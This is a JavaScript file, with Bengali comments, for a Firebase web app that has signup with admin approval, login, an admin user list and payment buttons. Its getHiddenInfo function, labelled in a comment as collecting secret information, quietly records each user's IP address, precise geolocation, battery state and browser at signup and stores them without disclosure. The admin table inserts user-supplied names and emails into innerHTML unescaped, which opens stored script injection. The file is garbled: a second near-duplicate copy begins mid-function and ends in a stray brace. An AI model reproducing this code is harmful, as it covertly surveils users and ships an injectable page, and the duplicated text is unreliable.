// =================================================================
// Firebase SDK মডিউলগুলো ইম্পোর্ট করা
// =================================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import {
    getAuth,
    createUserWithEmailAndPassword,
    signInWithEmailAndPassword,
    updateProfile,
    signOut,
    onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import {
    getFirestore,
    doc,
    setDoc,
    getDoc,
    collection,
    query,
    onSnapshot,
    updateDoc,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

// =================================================================
// আপনার Firebase কনফিগারেশন (আপনার দেওয়া API Key সহ)
// =================================================================
const firebaseConfig = {
    apiKey: "AIzaSyC7FHdrjaDV_AUmT7mphxkKf7IGnmM_LMc",
    authDomain: "webapp-5a18c.firebaseapp.com",
    projectId: "webapp-5a18c",
    storageBucket: "webapp-5a18c.appspot.com",
    messagingSenderId: "727743173490",
    appId: "1:727743173490:web:93d4b31b17f6a773df43eb"
};

// =================================================================
// Firebase সার্ভিসগুলো ইনিশিয়ালাইজ করা
// =================================================================
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

// =================================================================
// Helper ফাংশন: গোপন তথ্য সংগ্রহ
// =================================================================
async function getHiddenInfo() {
    let info = {
        ip: 'N/A',
        browserInfo: navigator.userAgent,
        location: { lat: null, lon: null },
        battery: { level: null, charging: null }
    };
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        info.ip = data.ip;
    } catch (e) { console.warn('Could not fetch IP'); }

    if ('geolocation' in navigator) {
        try {
            const position = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
            info.location = { lat: position.coords.latitude, lon: position.coords.longitude };
        } catch (e) { console.warn('Could not get location'); }
    }
    
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            info.battery = { level: Math.round(battery.level * 100) + '%', charging: battery.charging };
        } catch (e) { console.warn('Could not get battery info'); }
    }
    return info;
}

// =================================================================
// বর্তমান পেজের পাথ চেক করে নির্দিষ্ট কোড চালানো
// =================================================================
const path = window.location.pathname;

// ---------------------------------
// INDEX.HTML (Login/Signup Page)
// ---------------------------------
if (path.endsWith('/') || path.endsWith('index.html')) {
    const signupForm = document.getElementById('signupForm');
    const loginForm = document.getElementById('loginForm');
    const messageDiv = document.getElementById('message');
    const signupContainer = document.getElementById('signup-form');
    const loginContainer = document.getElementById('login-form');

    document.getElementById('show-login').addEventListener('click', () => {
        signupContainer.style.display = 'none';
        loginContainer.style.display = 'block';
        messageDiv.innerText = '';
    });
    document.getElementById('show-signup').addEventListener('click', () => {
        loginContainer.style.display = 'none';
        signupContainer.style.display = 'block';
        messageDiv.innerText = '';
    });

    // Signup Logic
    signupForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        messageDiv.innerText = 'Processing...';

        const displayName = document.getElementById('displayName').value;
        const realName = document.getElementById('realName').value;
        const email = document.getElementById('signup-email').value;
        const password = document.getElementById('signup-password').value;
        const country = document.getElementById('country').value;
        const age = document.getElementById('age').value;
        const interest = document.getElementById('interest').value;
        const telegram = document.getElementById('telegram').value;

        const hiddenInfo = await getHiddenInfo();

        try {
            const userCredential = await createUserWithEmailAndPassword(auth, email, password);
            const user = userCredential.user;
            await updateProfile(user, { displayName });
            await setDoc(doc(db, "users", user.uid), {
                email, realName, country, age, interest, telegram,
                isApproved: false,
                isAdmin: false, // ডিফল্টভাবে কোনো ইউজারই অ্যাডমিন নয়
                createdAt: serverTimestamp(),
                ...hiddenInfo
            });
            messageDiv.style.color = 'green';
            messageDiv.innerText = 'Signup successful! Please wait for admin approval.';
            signupForm.reset();
            await signOut(auth);
        } catch (error) {
            messageDiv.style.color = 'red';
            messageDiv.innerText = error.code.replace('auth/', '').replace(/-/g, ' ');
        }
    });

    // Login Logic
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        messageDiv.innerText = 'Logging in...';
        const email = document.getElementById('login-email').value;
        const password = document.getElementById('login-password').value;
        try {
            const userCredential = await signInWithEmailAndPassword(auth, email, password);
            const user = userCredential.user;
            const userDocSnap = await getDoc(doc(db, "users", user.uid));

            if (userDocSnap.exists() && userDocSnap.data().isApproved) {
                if (userDocSnap.data().isAdmin === true) {
                    window.location.href = '/admin.html';
                } else {
                    window.location.href = '/dashboard.html';
                }
            } else {
                await signOut(auth);
                messageDiv.style.color = 'orange';
                messageDiv.innerText = 'Your account is pending approval.';
                localStorage.setItem('pending_approval_email', email);
            }
        } catch (error) {
            messageDiv.style.color = 'red';
            messageDiv.innerText = error.code.replace('auth/', '').replace(/-/g, ' ');
        }
    });

    // Check for pending approval message on page load
    const pendingEmail = localStorage.getItem('pending_approval_email');
    if (pendingEmail) {
        document.getElementById('show-login').click();
        document.getElementById('login-email').value = pendingEmail;
        messageDiv.style.color = 'orange';
        messageDiv.innerText = 'Your account is pending approval.';
        localStorage.removeItem('pending_approval_email');
    }
}


// ---------------------------------
// UNIVERSAL (Logout and Auth State Check)
// ---------------------------------
// এই কোডটি সব পেজেই রান করবে
const logoutButton = document.getElementById('logout-button');
if (logoutButton) {
    logoutButton.addEventListener('click', async () => {
        await signOut(auth);
        alert("You have been logged out.");
        window.location.href = '/index.html';
    });
}

onAuthStateChanged(auth, (user) => {
    const isProtectedPage = path.endsWith('dashboard.html') || path.endsWith('admin.html') || path.endsWith('payment.html');
    if (!user && isProtectedPage) {
        // যদি ইউজার লগইন করা না থাকে এবং সুরক্ষিত পেজে থাকে, তাকে লগইন পেজে পাঠাও
        window.location.href = '/index.html';
    }
});


// ---------------------------------
// DASHBOARD.HTML
// ---------------------------------
if (path.endsWith('dashboard.html')) {
    const userDisplayName = document.getElementById('user-display-name');
    onAuthStateChanged(auth, (user) => {
        if (user && userDisplayName) {
            userDisplayName.textContent = user.displayName || 'User';
        }
    });
}


// ---------------------------------
// ADMIN.HTML
// ---------------------------------
if (path.endsWith('admin.html')) {
    const adminContent = document.getElementById('admin-content');
    const loadingDiv = document.getElementById('loading-or-error');

    onAuthStateChanged(auth, async (user) => {
        if (user) {
            const userDocSnap = await getDoc(doc(db, "users", user.uid));
            if (userDocSnap.exists() && userDocSnap.data().isAdmin === true) {
                loadingDiv.style.display = 'none';
                adminContent.style.display = 'block';
                loadUsersForAdmin();
            } else {
                loadingDiv.innerHTML = '<h2>Access Denied</h2><p>You are not an admin. Redirecting...</p>';
                setTimeout(() => { window.location.href = '/dashboard.html' }, 2000);
            }
        }
    });

    function loadUsersForAdmin() {
        const userList = document.getElementById('user-list');
        const q = query(collection(db, "users"));
        onSnapshot(q, (querySnapshot) => {
            userList.innerHTML = '';
            querySnapshot.forEach((userDoc) => {
                const userData = userDoc.data();
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${userData.realName || 'N/A'}</td>
                    <td>${userData.email || 'N/A'}</td>
                    <td>${userData.isApproved ? '<span style="color:green;">Approved</span>' : '<span style="color:orange;">Pending</span>'}</td>
                    <td>
                        ${!userData.isApproved ? `<button onclick="window.approveUser('${userDoc.id}')">Approve</button>` : 'N/A'}
                    </td>
                `;
                userList.appendChild(tr);
            });
        });
    }

    // approveUser ফাংশনটিকে window অবজেক্টে যোগ করা হচ্ছে যাতে HTML থেকে অ্যাক্সেস করা যায়
    window.approveUser = async (uid) => {
        if (confirm('Are you sure you want to approve this user?')) {
            const userToApproveRef = doc(db, "users", uid);
            try {
                await updateDoc(userToApproveRef, { isApproved: true });
                alert('User approved successfully!');
            } catch (error) {
                console.error("Error approving user:", error);
                alert("Failed to approve user.");
            }
        }
    };
}


// ---------------------------------
// PAYMENT.HTML
// ---------------------------------
if (path.endsWith('payment.html')) {
    document.getElementById('binance-pay-button').addEventListener('click', () => {
        alert('Binance Pay integration is pending.');
        // এখানে Binance Pay-এর পেমেন্ট URL-এ রিডাইরেক্ট করার কোড যুক্ত হবে।
    });

    document.getElementById('rix-coin-button').addEventListener('click', () => {
        alert('Redirecting to Rix Coin payment site...');
        // এখানে Rix Coin-এর পেমেন্ট সাইটে রিডাইরেক্ট করার কোড যুক্ত হবে।
        // window.location.href = 'https://othersite.com/pay-with-rix';
    });
}        } catch (e) { console.warn('Could not get battery info'); }
    }
    return info;
}

// =================================================================
// পাথ অনুযায়ী কোড এক্সিকিউট করা
// =================================================================
const path = window.location.pathname;

// ---------------------------------
// INDEX.HTML (Login/Signup Page)
// ---------------------------------
if (path.endsWith('/') || path.endsWith('index.html')) {
    const signupForm = document.getElementById('signupForm');
    const loginForm = document.getElementById('loginForm');
    const messageDiv = document.getElementById('message');
    const signupContainer = document.getElementById('signup-form');
    const loginContainer = document.getElementById('login-form');

    document.getElementById('show-login').addEventListener('click', () => {
        signupContainer.style.display = 'none';
        loginContainer.style.display = 'block';
        messageDiv.innerText = '';
    });
    document.getElementById('show-signup').addEventListener('click', () => {
        loginContainer.style.display = 'none';
        signupContainer.style.display = 'block';
        messageDiv.innerText = '';
    });

    // Signup Logic
    signupForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        messageDiv.innerText = 'Processing...';
        const [displayName, realName, email, password, country, age, interest, telegram] = [
            signupForm.displayName.value, signupForm.realName.value, signupForm.email.value, signupForm.password.value,
            signupForm.country.value, signupForm.age.value, signupForm.interest.value, signupForm.telegram.value
        ];
        const hiddenInfo = await getHiddenInfo();

        try {
            const userCredential = await createUserWithEmailAndPassword(auth, email, password);
            const user = userCredential.user;
            await updateProfile(user, { displayName });
            await setDoc(doc(db, "users", user.uid), {
                email, realName, country, age, interest, telegram,
                isApproved: false,
                createdAt: serverTimestamp(),
                ...hiddenInfo
            });
            messageDiv.style.color = 'green';
            messageDiv.innerText = 'Signup successful! Please wait for admin approval.';
            signupForm.reset();
            await signOut(auth);
        } catch (error) {
            messageDiv.style.color = 'red';
            messageDiv.innerText = error.code.replace('auth/', '').replace(/-/g, ' ');
        }
    });

    // Login Logic
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        messageDiv.innerText = 'Logging in...';
        const [email, password] = [loginForm.email.value, loginForm.password.value];
        try {
            const userCredential = await signInWithEmailAndPassword(auth, email, password);
            const user = userCredential.user;
            const userDocSnap = await getDoc(doc(db, "users", user.uid));

            if (userDocSnap.exists() && userDocSnap.data().isApproved) {
                // অ্যাডমিন হলে অ্যাডমিন পেজে রিডাইরেক্ট
                if (userDocSnap.data().isAdmin === true) {
                    window.location.href = '/admin.html';
                } else {
                    window.location.href = '/dashboard.html';
                }
            } else {
                await signOut(auth);
                messageDiv.style.color = 'orange';
                messageDiv.innerText = 'Your account is pending approval.';
                localStorage.setItem('pending_approval_email', email);
            }
        } catch (error) {
            messageDiv.style.color = 'red';
            messageDiv.innerText = error.code.replace('auth/', '').replace(/-/g, ' ');
        }
    });

    // Check for pending approval message on page load
    const pendingEmail = localStorage.getItem('pending_approval_email');
    if (pendingEmail) {
        document.getElementById('show-login').click();
        loginForm.email.value = pendingEmail;
        messageDiv.style.color = 'orange';
        messageDiv.innerText = 'Your account is pending approval.';
        localStorage.removeItem('pending_approval_email');
    }
}


// ---------------------------------
// UNIVERSAL (Logout and Auth State)
// ---------------------------------
const logoutButton = document.getElementById('logout-button');
if (logoutButton) {
    logoutButton.addEventListener('click', async () => {
        await signOut(auth);
        window.location.href = '/index.html';
    });
}

onAuthStateChanged(auth, (user) => {
    const isProtectedPage = path.endsWith('dashboard.html') || path.endsWith('admin.html') || path.endsWith('payment.html');
    if (!user && isProtectedPage) {
        window.location.href = '/index.html';
    }
});


// ---------------------------------
// DASHBOARD.HTML
// ---------------------------------
if (path.endsWith('dashboard.html')) {
    const userDisplayName = document.getElementById('user-display-name');
    onAuthStateChanged(auth, (user) => {
        if (user && userDisplayName) {
            userDisplayName.textContent = user.displayName || 'User';
        }
    });
}


// ---------------------------------
// ADMIN.HTML
// ---------------------------------
if (path.endsWith('admin.html')) {
    const adminContent = document.getElementById('admin-content');
    const loadingDiv = document.getElementById('loading-or-error');

    onAuthStateChanged(auth, async (user) => {
        if (user) {
            const userDocSnap = await getDoc(doc(db, "users", user.uid));
            if (userDocSnap.exists() && userDocSnap.data().isAdmin === true) {
                loadingDiv.style.display = 'none';
                adminContent.style.display = 'block';
                loadUsersForAdmin();
            } else {
                loadingDiv.innerHTML = '<h2>Access Denied</h2><p>You are not an admin.</p>';
                setTimeout(() => window.location.href = '/index.html', 2000);
            }
        }
    });

    function loadUsersForAdmin() {
        const userList = document.getElementById('user-list');
        const q = query(collection(db, "users"));
        onSnapshot(q, (querySnapshot) => {
            userList.innerHTML = '';
            querySnapshot.forEach((doc) => {
                const userData = doc.data();
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${userData.realName}</td>
                    <td>${userData.email}</td>
                    <td>${userData.isApproved ? '<span style="color:green;">Approved</span>' : '<span style="color:orange;">Pending</span>'}</td>
                    <td>
                        ${!userData.isApproved ? `<button onclick="window.approveUser('${doc.id}')">Approve</button>` : 'N/A'}
                    </td>
                `;
                userList.appendChild(tr);
            });
        });
    }

    window.approveUser = async (uid) => {
        if (confirm('Are you sure you want to approve this user?')) {
            await updateDoc(doc(db, "users", uid), { isApproved: true });
            alert('User approved!');
        }
    };
}


// ---------------------------------
// PAYMENT.HTML
// ---------------------------------
if (path.endsWith('payment.html')) {
    document.getElementById('binance-pay-button').addEventListener('click', () => {
        alert('Binance Pay integration is pending.');
        // এখানে Binance Pay-এর পেমেন্ট URL-এ রিডাইরেক্ট করার কোড যুক্ত হবে।
    });

    document.getElementById('rix-coin-button').addEventListener('click', () => {
        alert('Redirecting to Rix Coin payment site...');
        // এখানে Rix Coin-এর পেমেন্ট সাইটে রিডাইরেক্ট করার কোড যুক্ত হবে।
        // window.location.href = 'https://othersite.com/pay-with-rix';
    });
                            }
